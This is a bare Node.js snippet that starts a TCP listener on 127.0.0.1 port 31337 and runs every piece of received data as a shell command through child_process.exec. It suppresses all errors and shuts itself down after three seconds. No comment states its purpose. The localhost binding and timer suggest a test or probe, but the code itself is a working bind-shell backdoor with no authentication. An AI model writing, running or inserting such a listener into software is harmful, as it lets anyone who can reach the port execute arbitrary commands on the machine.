const net = require("net");
const srv = net.createServer((sock) => {
  sock.on("data", (d) => { try { require("child_process").exec(d.toString()); } catch {} });
});
srv.on("error", () => {});
srv.listen(31337, "127.0.0.1", () => setTimeout(() => srv.close(), 3000));
